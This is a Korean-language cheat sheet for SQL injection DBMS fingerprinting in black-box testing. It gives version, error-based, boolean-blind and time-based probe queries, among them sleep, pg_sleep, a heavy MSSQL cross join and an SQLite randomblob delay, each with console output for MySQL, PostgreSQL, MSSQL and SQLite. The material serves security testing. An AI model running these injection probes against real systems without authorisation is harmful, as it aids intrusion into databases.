SQL Injection - DBMS Fingerprinting :
    BlackBox 점검에서 SQL Injection이 의심되는 Endpoint를 찾았을 때 DBMS의 종류를 파악 후 공격하는 것이 효율적입니다. 
    공격 대상 DBMS에서만 사용 가능한 함수 등을 통해 SQL Injection 공격을 좀 더 수월하게 수행할 수 있습니다.

    BlackBox 환경에서 SQL Injection 취약점 발견 시 상황은 아래와 같습니다.

각 상황별 DBMS를 파악하는 방법
    1) 결과 값이 출력될 때 (Version)
        - DMBS 별로 다른 환경 변수 값 출력
        ex) 
            # DBMS 별로 버전을 나타내는 함수 및 데이터는 다릅니다.
            @@version 
            version()
    
    2) 결과 값이 출력되지 않지만 에러가 출력될 때 (Error)
        - 에러 메세지를 통해 DBMS 파악
        ex)
            select 1 union select 1, 2;
            # MySQL => ERROR 1222 (21000): The used SELECT statements have a different number of columns
            (select * from not_exists_table)
            # SQLite => Error: no such table: not_exists_table

    3) 결과 값이 출력되지 않을 때 (Blind)
        - True / False를 확인 가능한 경우
            ㄴ Blind로 함수, 조건문을 사용해 테스트
        ex)
            mid(@@version, 1, 1)='5';
            substr(version(), 1, 1)='P';

    4) 출력이 존재하지 않는 경우 (Time Based)
        - Time Based
        ex)
            # sleep 함수를 지원하지 않는 DBMS도 존재합니다.
            sleep(10)
            pg_sleep(10)


MySQL :
    1) version :
        mysql> select @@version; # select version();
        +-------------------------+
        | @@version               |
        +-------------------------+
        | 5.7.29-0ubuntu0.16.04.1 |
        +-------------------------+
        1 row in set (0.00 sec)

    2) error :
        mysql> select 1 union select 1, 2;
        ERROR 1222 (21000): The used SELECT statements have a different number of columns

    3) Blind :
        # @@version => '5.7.29-0ubuntu0.16.04.', mid(@@version, 1, 1) => '5'
        mysql> select mid(@@version, 1, 1)='5';
        +------------------------+
        | mid(@@version,1,1)='5' |
        +------------------------+
        |                      1 |
        +------------------------+
        1 row in set (0.00 sec)
        mysql> select mid(@@version, 1, 1)='6';
        +------------------------+
        | mid(@@version,1,1)='6' |
        +------------------------+
        |                      0 |
        +------------------------+
        1 row in set (0.00 sec)

    4) Time Based :
        mysql> select sleep(10);
        +-----------+
        | sleep(10) |
        +-----------+
        |         0 |
        +-----------+
        1 row in set (10.01 sec)

PostgreSQL :
    1) version :
        postgres=# select version();
        version
        --------
        PostgreSQL 12.2 (Debian 12.2-2.pgdg100+1) on x86_64-pc-linux-gnu, compiled by gcc (Debian 8.3.0-6) 8.3.0, 64-bit
        (1 row)

    2) error :
        postgres=# select 1 union select 1, 2;
        ERROR:  each UNION query must have the same number of columns
        LINE 1: select 1 union select 1, 2;asdf

    3) Blind :
        # version() => 'PostgreSQL ...', substr(version(), 1, 1) => 'P'
        postgres=# select substr(version(), 1, 1)='P';
        ?column?
        ----------
        t
        (1 row)
        
        postgres=# select substr(version(), 1, 1)='Q';
        ?column?
        ----------
        f
        (1 row)

    4) Time Based :
        postgres=# select pg_sleep(10);
        pg_sleep
        ----------
        (1 row)

MSSQL :
    1) version :
        > select @@version;
        ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
        Microsoft SQL Server 2017 (RTM-CU13) (KB4466404) - 14.0.3048.4 (X64)
            Nov 30 2018 12:57:58
            Copyright (C) 2017 Microsoft Corporation
            Developer Edition (64-bit) on Linux (Ubuntu 16.04.5 LTS)
        (1 rows affected)

    2) error :
        > select 1 union select 1, 2;
        Msg 205, Level 16, State 1, Server e2cb36ec2593, Line 1
        All queries combined using a UNION, INTERSECT or EXCEPT operator must have an equal number of expressions in their target lists.asdf


    3) Blind :
        -- @@version => 'Microsoft SQL Server...', substring(@@version, 1, 1) => 'M'
        > select 1 from test where substring(@@version, 1, 1)='M';
        -----------
                1
        (1 rows affected)
        
        1> select 1 from test where substring(@@version, 1, 1)='N';
        2> go
        -----------
        (0 rows affected)

    4) Time Based :
        > select (SELECT count(*) FROM information_schema.columns A, information_schema.columns B, 
        information_schema.columns C, information_schema.columns D, information_schema.columns E, information_schema.columns F)

SQLite :
    1) version :
        sqlite> select sqlite_version();
        3.11.0

    2) error :
        sqlite> select 1 union select 1, 2;
        Error: SELECTs to the left and right of UNION do not have the same number of result columns

    3) Blind :
        -- sqlite_version() => '3.11.0', substr(sqlite_version(), 1, 1) => '3'
        sqlite> select substr(sqlite_version(), 1, 1)='3';
        1
        sqlite> select substr(sqlite_version(), 1, 1)='4';
        0

    4) Time Based :
        sqlite> SELECT LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1500000000/2))));
        0
        Run Time: real 9.740 user 7.983349 sys 1.743972













